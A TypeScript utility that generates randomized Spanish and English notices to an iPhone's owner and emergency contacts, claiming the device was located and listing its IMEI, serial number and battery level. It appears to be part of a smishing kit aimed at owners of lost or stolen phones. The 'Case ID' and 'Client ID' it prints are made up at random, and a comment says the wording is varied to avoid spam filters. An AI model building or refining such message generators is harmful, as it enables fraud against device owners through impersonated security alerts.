// Generar ID de caso aleatorio (CAS-YYYYMMDD-XXXX)
const generateCaseId = () => {
  const now = new Date();
  const dateStr = now.toISOString().slice(0, 10).replace(/-/g, '');
  const random4Digits = Math.floor(1000 + Math.random() * 9000);
  return `CAS-${dateStr}-${random4Digits}`;
};

// Generar ID de cliente aleatorio (CL-XXXXXXXXXXXX)
const generateClientId = () => {
  const random12Digits = Math.floor(100000000000 + Math.random() * 900000000000);
  return `CL-${random12Digits}`;
};

// Utilidad para generar mensajes aleatorios y evitar spam
export const generateRandomMessage = (process: any, language: 'spanish' | 'english', battery: number, delayedTime: Date, formatDate: (date: Date, lang: string) => string, formatTime: (date: Date) => string) => {
  const random = (arr: any[]) => arr[Math.floor(Math.random() * arr.length)];
  const caseId = generateCaseId();
  const clientId = generateClientId();
  
  if (language === 'spanish') {
    if (process.contact_type === 'propietario') {
      // Variaciones para mensajes al propietario en español
      const openings = [
        "🛡️ Alerta de seguridad del sistema",
        "🔐 Notificación de seguridad",
        "🔒 Sistema de protección activado"
      ];
      
      const detectionPhrases = [
        `Fecha: ${formatDate(delayedTime, 'spanish')} – ${formatTime(delayedTime)}\nActividad detectada tras reconexión a internet.\nEstado del dispositivo: En línea ✅\n\nID de caso: ${caseId}\nID de cliente: ${clientId}`,
        `Registro: ${formatDate(delayedTime, 'spanish')} – ${formatTime(delayedTime)}\nEquipo detectado después de conectarse a la red.\nEstatus: Operativo ✅\n\nCaso: ${caseId}\nCliente: ${clientId}`,
        `Hora: ${formatDate(delayedTime, 'spanish')} – ${formatTime(delayedTime)}\nDispositivo localizado al establecer conexión.\nEstado: Activo ✅\n\nReferencia: ${caseId}\nUsuario: ${clientId}`
      ];
      
      const statusPhrases = [
        "Detalles del dispositivo:",
        "Información del equipo:",
        "Datos técnicos:"
      ];
      
      
      const deviceSections = [
        `• Modelo: ${process.iphone_model}
• Color: ${process.color} | Capacidad: ${process.storage}
• IMEI: ${process.imei}
• Serie: ${process.serial_number}
• Nivel de batería: ${battery} %`,
        
        `• Dispositivo: ${process.iphone_model}
• Coloración: ${process.color} | Almacenamiento: ${process.storage}
• Código IMEI: ${process.imei}
• No. Serie: ${process.serial_number}
• Batería actual: ${battery} %`,
        
        `• Equipo: ${process.iphone_model}
• Color: ${process.color} | Memoria: ${process.storage}
• Identificador IMEI: ${process.imei}
• Número de serie: ${process.serial_number}
• Carga restante: ${battery} %`
      ];
      
      const helpPhrases = [
        "¿Necesitás ayuda? Escribí *Menú* para asistencia técnica 👨‍💻",
        "¿Requerís soporte? Respondé *Menú* para ayuda especializada 🔧",
        "¿Buscás asistencia? Enviá *Menú* para contactar soporte 👩‍💻"
      ];
      
      const closings = [
        "Servicio automatizado – Atención disponible 24 h",
        "Sistema automático – Soporte activo 24/7",
        "Monitoreo continuo – Asistencia permanente"
      ];
      
      return `${random(openings)}

${random(detectionPhrases)}

${random(statusPhrases)}
${random(deviceSections)}

${random(helpPhrases)}
${random(closings)}`;
      
    } else {
      // Variaciones para contacto de emergencia en español
      const openings = [
        "🚨 Alerta de contacto de emergencia",
        "⚠️ Notificación automática de seguridad",
        "🔔 Sistema de alerta activado"
      ];
      
      const detectionPhrases = [
        `El dispositivo de **${process.owner_name || 'usuario registrado'}** ha sido detectado.\n\nFecha: ${formatDate(delayedTime, 'spanish')} – ${formatTime(delayedTime)}\nEstado: Localizado ✅\n\nID de caso: ${caseId}\nID de cliente: ${clientId}`,
        `Equipo perteneciente a **${process.owner_name || 'usuario registrado'}** localizado.\n\nRegistro: ${formatDate(delayedTime, 'spanish')} – ${formatTime(delayedTime)}\nEstatus: En línea ✅\n\nCaso: ${caseId}\nCliente: ${clientId}`,
        `Dispositivo de **${process.owner_name || 'usuario registrado'}** rastreado exitosamente.\n\nHora: ${formatDate(delayedTime, 'spanish')} – ${formatTime(delayedTime)}\nEstado: Activo ✅\n\nReferencia: ${caseId}\nUsuario: ${clientId}`
      ];
      
      const emergencyPhrases = [
        "**Mensaje automático enviado a contactos de emergencia**",
        "**Notificación dirigida a red de contactos de seguridad**",
        "**Alerta generada para contactos verificados**"
      ];
      
      const deviceSections = [
        `**Información del dispositivo:**
• Modelo: ${process.iphone_model}
• Color: ${process.color} | Almacenamiento: ${process.storage}
• IMEI: ${process.imei}
• Serie: ${process.serial_number}
• Batería: ${battery}%`,
        
        `**Detalles del equipo:**
• Dispositivo: ${process.iphone_model}
• Coloración: ${process.color} | Capacidad: ${process.storage}
• Código IMEI: ${process.imei}
• No. Serie: ${process.serial_number}
• Nivel batería: ${battery}%`
      ];
      
      const contactPhrases = [
        `**Eres un contacto de emergencia de ${process.owner_name || 'este dispositivo'}**`,
        `**Formas parte de la red de emergencia de ${process.owner_name || 'este usuario'}**`,
        `**Estás registrado como contacto de seguridad de ${process.owner_name || 'este equipo'}**`
      ];
      
      const instructionPhrases = [
        "**IMPORTANTE**: Por favor, informa al propietario que su equipo fue localizado.",
        "**ACCIÓN REQUERIDA**: Notifica al dueño que su dispositivo ha sido encontrado.",
        "**AVISO**: Comunica al propietario que su equipo fue detectado."
      ];
      
      const helpPhrases = [
        "Para asistencia inmediata *Responde* **Menú**",
        "Para soporte técnico *Escribe* **Menú**",
        "Para ayuda especializada *Envía* **Menú**"
      ];
      
      const closings = [
        "Sistema de emergencia – Servicio 24/7",
        "Red de seguridad – Atención continua",
        "Protocolo de alerta – Monitoreo permanente"
      ];
      
      return `${random(openings)}

${random(detectionPhrases)}

${random(emergencyPhrases)}

${random(deviceSections)}

${random(contactPhrases)}

${random(instructionPhrases)}

${random(helpPhrases)}

${random(closings)}`;
    }
  } else {
    // Mensajes en inglés con variaciones similares
    if (process.contact_type === 'propietario') {
      const openings = [
        "🛡️ System security alert",
        "🔐 Security notification",
        "🔒 Protection system activated"
      ];
      
      const detectionPhrases = [
        `Date: ${formatDate(delayedTime, 'english')} – ${formatTime(delayedTime)}\nActivity detected after internet reconnection.\nDevice status: Online ✅\n\nCase ID: ${caseId}\nClient ID: ${clientId}`,
        `Record: ${formatDate(delayedTime, 'english')} – ${formatTime(delayedTime)}\nDevice detected after network connection.\nStatus: Operational ✅\n\nCase: ${caseId}\nClient: ${clientId}`,
        `Time: ${formatDate(delayedTime, 'english')} – ${formatTime(delayedTime)}\nDevice located upon connection establishment.\nStatus: Active ✅\n\nReference: ${caseId}\nUser: ${clientId}`
      ];
      
      const statusPhrases = [
        "Device details:",
        "Equipment information:",
        "Technical data:"
      ];
      
      
      const deviceSections = [
        `• Model: ${process.iphone_model}
• Color: ${process.color} | Capacity: ${process.storage}
• IMEI: ${process.imei}
• Serial: ${process.serial_number}
• Battery level: ${battery} %`,
        
        `• Device: ${process.iphone_model}
• Color: ${process.color} | Storage: ${process.storage}
• IMEI Code: ${process.imei}
• Serial No.: ${process.serial_number}
• Current battery: ${battery} %`
      ];
      
      const helpPhrases = [
        "Need help? Write *Menu* for technical assistance 👨‍💻",
        "Require support? Reply *Menu* for specialized help 🔧",
        "Looking for assistance? Send *Menu* to contact support 👩‍💻"
      ];
      
      const closings = [
        "Automated service – 24 h assistance available",
        "Automatic system – 24/7 active support",
        "Continuous monitoring – Permanent assistance"
      ];
      
      return `${random(openings)}

${random(detectionPhrases)}

${random(statusPhrases)}
${random(deviceSections)}

${random(helpPhrases)}
${random(closings)}`;
      
    } else {
      // Emergency contact message in English
      const openings = [
        "🚨 Emergency contact alert",
        "⚠️ Automatic security notification",
        "🔔 Alert system activated"
      ];
      
      const detectionPhrases = [
        `Device belonging to **${process.owner_name || 'registered user'}** has been detected.\n\nDate: ${formatDate(delayedTime, 'english')} – ${formatTime(delayedTime)}\nStatus: Located ✅\n\nCase ID: ${caseId}\nClient ID: ${clientId}`,
        `Equipment owned by **${process.owner_name || 'registered user'}** located.\n\nRecord: ${formatDate(delayedTime, 'english')} – ${formatTime(delayedTime)}\nStatus: Online ✅\n\nCase: ${caseId}\nClient: ${clientId}`,
        `Device from **${process.owner_name || 'registered user'}** tracked successfully.\n\nTime: ${formatDate(delayedTime, 'english')} – ${formatTime(delayedTime)}\nStatus: Active ✅\n\nReference: ${caseId}\nUser: ${clientId}`
      ];
      
      const emergencyPhrases = [
        "**Automatic message sent to emergency contacts**",
        "**Notification directed to security contact network**",
        "**Alert generated for verified contacts**"
      ];
      
      const deviceSections = [
        `**Device information:**
• Model: ${process.iphone_model}
• Color: ${process.color} | Storage: ${process.storage}
• IMEI: ${process.imei}
• Serial: ${process.serial_number}
• Battery: ${battery}%`,
        
        `**Equipment details:**
• Device: ${process.iphone_model}
• Color: ${process.color} | Capacity: ${process.storage}
• IMEI Code: ${process.imei}
• Serial No.: ${process.serial_number}
• Battery level: ${battery}%`
      ];
      
      const contactPhrases = [
        `**You are an emergency contact for ${process.owner_name || 'this device'}**`,
        `**You are part of the emergency network for ${process.owner_name || 'this user'}**`,
        `**You are registered as a security contact for ${process.owner_name || 'this equipment'}**`
      ];
      
      const instructionPhrases = [
        "**IMPORTANT**: Please inform the owner that their device was located.",
        "**ACTION REQUIRED**: Notify the owner that their device has been found.",
        "**NOTICE**: Communicate to the owner that their equipment was detected."
      ];
      
      const helpPhrases = [
        "For immediate assistance *Reply* **Menu**",
        "For technical support *Write* **Menu**",
        "For specialized help *Send* **Menu**"
      ];
      
      const closings = [
        "Emergency system – 24/7 service",
        "Security network – Continuous attention",
        "Alert protocol – Permanent monitoring"
      ];
      
      return `${random(openings)}

${random(detectionPhrases)}

${random(emergencyPhrases)}

${random(deviceSections)}

${random(contactPhrases)}

${random(instructionPhrases)}

${random(helpPhrases)}

${random(closings)}`;
    }
  }
};
